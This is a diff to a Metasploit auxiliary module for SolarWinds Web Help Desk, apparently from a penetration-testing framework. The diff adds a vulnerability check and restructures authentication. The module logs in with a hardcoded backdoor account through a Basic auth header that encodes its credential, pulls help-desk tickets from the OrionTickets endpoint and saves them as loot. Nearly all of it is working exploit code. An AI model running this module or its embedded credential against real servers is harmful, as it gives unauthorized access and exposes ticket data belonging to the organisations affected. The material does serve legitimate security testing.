@@ -1,6 +1,8 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
+  prepend Msf::Exploit::Remote::AutoCheck
+  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -42,9 +44,19 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run
-    print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')
+  def check
+    @auth = auth
 
+    if @auth.code == 401
+      return Exploit::CheckCode::Safe
+    elsif @auth.code == 200
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def auth
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
@@ -52,16 +64,20 @@ class MetasploitModule < Msf::Auxiliary
         'Authorization' => 'Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw=='
       }
     )
+    res
+  end
 
-    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + res.to_s) unless res&.code == 200
+  def run
+    print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')
+    @auth ||= auth
 
-    body = res.body
-    if body.include?('shortSubject')
-      jbody = JSON.parse(body)
-      print_good('Successfully authenticated and tickets retrieved:')
-      print_good(JSON.pretty_generate(jbody))
-      file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
-      print_good("Saved tickets to #{file}")
-    end
+    body = @auth.body
+    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless body.include?('shortSubject')
+
+    jbody = JSON.parse(body)
+    print_good('Successfully authenticated and tickets retrieved:')
+    print_good(JSON.pretty_generate(jbody))
+    file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
+    print_good("Saved tickets to #{file}")
   end
 end
